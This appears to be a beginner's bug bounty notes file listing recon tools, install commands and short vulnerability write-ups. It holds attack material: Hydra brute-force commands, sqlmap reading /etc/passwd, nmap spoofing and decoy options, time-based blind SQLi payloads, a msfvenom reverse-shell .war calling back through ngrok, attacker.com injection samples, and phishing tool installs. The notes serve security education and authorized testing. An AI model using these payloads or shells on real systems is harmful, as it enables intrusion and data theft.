# bug_bounty_notes
*Note this is a work in progress - I'll be looking to make constant additions to this. I am also a beginner in Bug Hunting myself but this is a brief collection of notes - in the hope it could also help you too. Feel free to make any requests of change or added insight - I can be contacted from the discord server in my Bio. Thank you*


# What is a Bug Bounty?:
A bug bounty program is a deal offered by many websites, organizations and software developers by which individuals can receive recognition and compensation for reporting bugs, especially those pertaining to security exploits and vulnerabilities.


### These are some useful YT channels:
LiveOverflow
Bugcrowd
Nahamsec
STÖK
SecurityIdiots


# Recommended Skills:
- Linux basics, Networking basics, programming 
- Basic idea about the HTTP protocols and its headers(Request and Response)
- Burpsuite , Metasploit , SqlMap , Nmap , etc.


## Choosing a Target:
Bug Bounty Platforms
    Bugcrowd
https://www.bugcrowd.com/
    Hackerone
https://www.hackerone.com/
    Synack
https://www.synack.com/
    Japan Bug bounty Program
https://bugbounty.jp/
    Cobalt
https://cobalt.io/
    Zerocopter
https://zerocopter.com/
    Hackenproof
https://hackenproof.com/
    BountyFactory
https://bountyfactory.io
    Bug Bounty Programs List
https://www.bugcrowd.com/bug-bounty-list/
    AntiHack
https://www.antihack.me/

Or you can find targets from Google by searching for *responsible disclosure policy* of a website. I recommend to start with responsible disclosure , so there are more chances for acceptance of report. And then after an experience, start with Bug Bounty Platform.


## Have a Target, Now what?
If you have chosen your target, then you should start finding the subdomain of the target.
or we can start with the IP blocks of the targets which we can get from the ASN (some of the websites are mentioned in below)


## Why do we need subdomain?
Sometimes targeting the main domain is not possible to find bugs which will cause frustration to the beginners. Because the top or other researchers are already found and reported the bugs to the target. Therefore beginners should start with the other subdomains.


## How to find Sub-domains?
Small list of tools (many more available)
-    Subfinder
-    Amass
-    Sublist3r
-    Aquatone
-    Knockpy

You can also find sub-domain via online recon tools
Virustotal ( Use its API in tools)
Dnsdumpster
Findsubdomains
Pentest-tools
Hackertarget


## Sub-Domain Takeover Vulnerability:
Go to this link to learn about some basics to advance concepts of Subdomain takeover vulnerability.
-	https://github.com/EdOverflow/can-i-take-over-xyz

Discovering Target Using ASN (IP Blocks):
-	https://whois.arin.net/ui/query.do

Discovering Target Using Shodan:
-	https://www.shodan.io/search?query=org%3...+Motors%22

Brand / TLD Discovery:
This will increase the target scope by searching for a Acquisition of a target
Acquisition — -> crunchbase, wikipedia
link discovery — ->burp spidering
weighted& reverse tracker → domlink, builtwith
   
    Trademark In Google: ” “Tesla © 2018” “Tesla © 2019” “Tesla © 2020” inurl:tesla
    Subfinder
    Gobuster
    Aquatone

# Subdomain Enumeration:
Here you can find the original scripts https://github.com/appsecco/bugcrowd-lev...numeration
*Note: Replace the API key used inside the scripts which may be an invalid which results in less amount of subdomains (I recommend to use virustotal API key)*

### Presentation:
Subdomain Enumeration with the SPF record
Using CSP
DNSrecon
ALTDNS
Zone transfer using dig
DNSSEC
Zone walking NSEC — LDNS

# Port Scanning:
The port scanning is very important to find the target which is running in non-standard or standard ports.
For port scanning I have used NMAP and Masscan and Aquatone scan.
Then the researcher will start checking for sub-domain takeover vulnerability once they found sub-domains which running on the standard or non-standard ports.
-    Enumerating Targets(Port Scanning)
-    NMAP
-    Visual Identification

This part will help us find an application that is running on standard or non-standard ports on the target machine.
The following tools are grabbing banner if they found on the target machine which is running on specific ports. That will help us to sort list our target sub-domains.
-    Eyewitness
-    Wayback Enumeration →> waybackurl

This technology will help us if we seen any one of the HTTP responses like 401,403,404. This will show you the old stored data using Archive.
Here we can find some sensitive information even when the target page is not currently accessible.
-	https://archieve.org/web

## Parsing JavaScript:
Parsing JS is very useful to find the directories which is used by the target. we can use these type of tools instead of brute-forcing the directory list on the target
*Note: Brute-Forcing of directory also good thing to do. Always use the multiple techniques to find the directory from the targets(I found Hotsar Aws Credentials with Directory Buster & Burp Intruder)*
-    linkfinder
-    DIRsearch
-    Dirb
-    Content Discovery: “ Gobuster”
-    Credential Bruteforce: “BrutesprayBrutespray”

These tools have the ability to brute-force the different type of protocols like http, ssh,smtp, etc

## Technology Identification and Vulnerability findings:
Here I use Wappalyzer available add-ons on for many browsers. Whatweb tool also I used to find the what technologies they used on the target.
The following tools to find technologies and technology based vulnerabilities on the target.
-    WPScan
-    Cmsmap

# Extensions for Web-App Hunting
- FoxyProxy
- Wappalyzer
- Tempmail
- Hunter
- Hack Tools
- Cookie-manager
- WebRTC
- Link Gopher
- Find Something
- uBlock Origin
- Open Multiple URLs
- Dark Reader
- Privacy Badger
- User-Agent Switcher
- Retire.js
- TWP Translate
- Tuffle Hug

# Installing Lesser known Tools
 
*Note* Some projects are depreciated/no-longer maintained, but they still can provide value to your bug hunting.
##### Ars0n-Framework
https://github.com/R-s0n/ars0n-framework

```
sudo apt update && sudo apt-get update
sudo apt -y upgrade && sudo apt-get -y upgrade
wget https://github.com/R-s0n/ars0n-framework/releases/download/v0.0.2-alpha/ars0n-framework-v0.0.2-alpha.tar.gz
tar -xzvf ars0n-framework-v0.0.2-alpha.tar.gz
rm ars0n-framework-v0.0.2-alpha.tar.gz
cd ars0n-framework
./install.sh
```

**This installs most Subdomain enumerator tools such as Sublist3r below**

##### Sublist3r
https://github.com/aboul3la/Sublist3r

```
git clone https://github.com/aboul3la/Sublist3r.git
cd Sublist3r

# Sublist3r depends on the requests, dnspython and argparse python modules.

# Installation on Windows:
	c:\python27\python.exe -m pip install -r requirements.txt
# Installation on Linux
	sudo pip install -r requirements.txt
```

##### Wafw00f
https://github.com/EnableSecurity/wafw00f

```
git clone https://github.com/EnableSecurity/wafw00f.git
cd wafw00f
sudo python3 setup.py install
```

##### XSStrike
```
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt --break-system-packages
python3 xsstrike.py
```
##### SSRFmap
```
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap/
pip3 install -r requirements.txt
python3 ssrfmap.py
```

##### SecretFinder
```
git clone https://github.com/m4ll0k/SecretFinder.git secretfinder
cd secretfinder
python -m pip install -r requirements.txt or pip install -r requirements.txt
python3 SecretFinder.py
```

SSTImap
```
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
python -m pip install -r requirements.txt or pip install -r requirements.txt
python3 sstimap.py
```

##### Subzy
`go install -v github.com/LukaSikic/subzy@latest`

##### OpenRedireX
```
git clone https://github.com/devanshbatham/openredirex
cd openredirex
sudo chmod +x setup.sh
./setup.sh
```

##### Waymore
```
git clone https://github.com/xnl-h4ck3r/waymore.git 
cd waymore
sudo python setup.py install

*If above doesn't work, install dependencies first*
sudo pip3 install -r requirements.txt
```

##### Seeker
```
git clone https://github.com/thewhiteh4t/seeker.git
cd seeker/
chmod +x install.sh
./install.sh
```

##### W3af
```
git clone https://github.com/andresriancho/w3af.git
cd w3af/
./w3af_console
. /tmp/w3af_dependency_install.sh
```

##### Maskphish
```
# Clone the repository 
git clone https://github.com/jaykali/maskphish

# Enter into the directory
cd maskphish

# Run the script
bash maskphish.sh
```

##### AdminHack
```
git clone https://github.com/mishakorzik/AdminHack
cd AdminHack
bash setup.sh
```

##### FavFreak
```
git clone https://github.com/devanshbatham/FavFreak
cd FavFreak
virtualenv -p python3 env
source env/bin/activate
python3 -m pip install mmh3
cat urls.txt | python3 favfreak.py 
```

##### Ghauri
```
git clone https://github.com/r0oth3x49/ghauri.git
python3 -m pip install --upgrade -r requirements.txt
python3 setup.py install or python3 -m pip install -e
```

##### LogSensor
```
git clone https://github.com/Mr-Robert0/Logsensor.git
cd Logsensor && sudo chmod +x logsensor.py install.sh
pip install -r requirements.txt
./install.sh
```

##### MagicRecon
```
git clone https://github.com/robotshell/magicRecon
$ cd magicRecon
$ chmod +x install.sh
$ ./install.sh
```


# Tools and Usage
## Gobuster
`gobuster dir -u http://10.10.10.10 -w /path-to/wordlist.txt -o output.txt`
 `gobuster dir -u -w /wordlist/txt -x html.php`
 `gobuster dns -d domain.com -w awesome_wordlist.txt -o output.txt`
## Hydra
##### Login with Web-Page
`hydra -L user.txt -P pass.txt 10.10.10.10 http-post-form "/login.php:password=^PASS^&User=^USER^:That Password Was Incorrect"`
##### SMB
`hydra -L user.txt -P pass.txt -vV 10.10.10.10 smb`

## APIs
**kiterunner**: Excellent for discovering API endpoints. Use it to scan and brute force paths and parameters against target APIs.
```
kr scan https://domain.com/api/ -w routes-large.kite -x 20
kr scan https://domain.com/api/ -A=apiroutes-220828 -x 20
kr brute https://domain.com/api/ -A=raft-large-words -x 20 -d=0
kr brute https://domain.com/api/ -w /tmp/lang-english.txt -x 20 -d=0
```
- Additional tools like **automatic-api-attack-tool**, **Astra**, and **restler-fuzzer** offer tailored functionalities for API security testing, ranging from attack simulation to fuzzing and vulnerability scanning.

https://github.com/shieldfy/API-Security-Checklist
https://github.com/bnematzadeh/LoggerPlusPlus-API-Filters
https://www.youtube.com/playlist?list=PLbyncTkpno5HqX1h2MnV6Qt4wvTb8Mpol
### Burp Extensions
- Logger++
- OpenAPI Parser
- Param Miner
- Autorize
- JSON Web Token Attacker (JOSEPH)
- Content Type Converter
- Attack Surface Detector
- [Levo Burp Extension](https://github.com/levoai/levoai-burp-extension)

### Enumerating SMB shares
```
smbclient -L 10.10.10.10 -U anonymous

smbclient \\\\10.10.10.10\\anonymous -U anonymous
```

```shell
ffuf -u http://10.10.10.10 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.domain" -fw [response size]
```
admin' or true--
```shell
dig ns domain @10.10.10.10
dig nx domain @10.10.10.10
dig any domain @10.10.10.10
dig axfr domain @10.10.10.10
```
```shell
sqlmap -r burpsuite.req --batch --dbms mysql --threads 10 -D database.db -T table --columns

{optional flags}
--current-user
--users
--tables
--file-read=/etc/passwd
```
```shell
# nmap scanning evasion options

#Hide a scan with decoys
-D DECOY1_IP1,DECOY_IP2,ME

#Hide a scan with random decoys
-D RND,RND,ME

#Use an HTTP/SOCKS4 proxy to relay connections
--proxies PROXY_URL

#Spoof source MAC Address
--spoof-mac MAC_ADDRESS

#Spoof source IP Address
-S IP_ADDRESS

#Use a specific source port number
-g PORT_NUM or --source-port PORT_NUM

#Scan subnet range
nmap -sn 10.0-10.10.10/24
```

# Unique Bug Write-ups
## Finding Microsoft ISS Servers
Google `intitle:"ISS Windows Server" site:.gov`
*'.gov' can be changed to alternatives such as '.us', '.mil', *

Use **Wappalyzer** to check for ISS version

Use Domain Extractor to combine all the domains into a single *.txt* file

`$ cat file.txt | httpx-tookit -sc -td --title| grep ISS`

Input Target URL from *file.txt*'s output above and **Scan**
Find a vulnerable site from the scan results

#### Shortscan Tool
`$ shortscan https://this.is.test.gov -F`

## Reflected Client Side HTML Injection - possibly to SSRF.
https://nasa.gov

Search bar - "Test"
Using Burp read the **HTTP History** for the */?search=Test*
Send the Request to Intruder
Place a payload on `Test`

Custom Payload - payloadallthethings [https://github.com/swisskyrepo/PayloadsAllTheThings]
Start Attack

If a `<a href="https//attacker.com/">Login Here</A>` places on the page as a clickable link just through the search parameter.  Show the response in browser from the attack results. 

If the clickable does send you to an external site, then copy the *payload injection* into **Burp's Collaborator**, Change the website and paste it into the vulnerable search parameter. Then test.

Go back to **Collaborator - Poll now** , the URL received will be the origin IP through SSRF.

`<img src=https://your_serverip>` for SSRF

## RCE via .war File Upload Vulnerability
1. Set up the ngrok and netcat listener
	`nc -lvp 1337`
	*0.tcp.ngrok.io14729*
2. Create a malicious **.war** file using msfvenom, replace LHOST and LPORT accordingly. 
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=0.tcp.ngrok.io LPORT=14729 -f war -o rev_shell.war

`chmod 777 -R .`
3. Upload the **.war** file into deploy section
4. Click on the newly created endpoint from the **.war** file contents and wait for the shell.
5. Observe that the code can be executed within the system by using the *NC* terminal to execute commands.

## Time Based Blind SQLi and XSS

https://selfeey.com/welcome/consultant?sortby=1

"Consultant Name" Search Parameter enter `Test` then search.

So URL changes to https://selfeey.com/welcome/consultant?sortby=1&search=Test
Now start to input SQLi.

Send the search URL on **Burp HTTP History** to **Repeater**, send Request and copy the URL above.

Then go to XSStrike in terminal. 
`python3 xsstrike.py -u "https://selfeey.com/welcome/consultant?sortby=1&search=Test" -l 4 -t 10`

Once Payload has been found alter the `search=Test` to `search={PAYLOAD}`

Also you can place a payload on `Test` in **Burp's Intruder** with the payload being and Attack.
```
SELECT CASE WHEN (1=1) THEN pg_sleep(25) ELSE pg_sleep(0) END--
COFFIN'XOR(if(now()=sysdate(),sleep(5*5),0))OR'COFFIN
1'=sleep(25)='1'
%2b(select*from(select(sleep(2)))a)%2b'
WAITFOR DELAY '0:0:25';--
OR SLEEP(25)
AND SLEEP(25) AND ('kleiton'='kleiton
WAITFOR DELAY '0:0:25' AND 'a'='a;--
IF 1=1 THEN dbms_look.sleep(25);
SLEEP(25)
pg_sleep(25)
and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--
DBMS_LOCK.SLEEP(25);
AND if not(substring((select @version),25,1) < 52)
waitfor delay '0:0:25'--
1,'0');waitfor delay '0:0:25;--
(SELECT 1 FROM (SELECT SLEEP(25))A)
%2b(select*from(slect(sleep(25)))a)%2b'
//xor//sleep(25)
or (sleep(25)+1) limit 1 --
```

## Simple Email Injection
Receiving an email like "Hello John, Welcome to abc.com"
The name could be fetched from the db and added to each users invites

An attacker can inject malicious content into an email message sent by the app. This includes HTML for the name that is added. The attacker can change their account name to - 
`<button href="attacker.com">OFFER FOR YOU!!</button>`
And the change account email with victims email.

- Also the use of email spoofing to render CRLF injection attacks, moving from out of scope to in scope

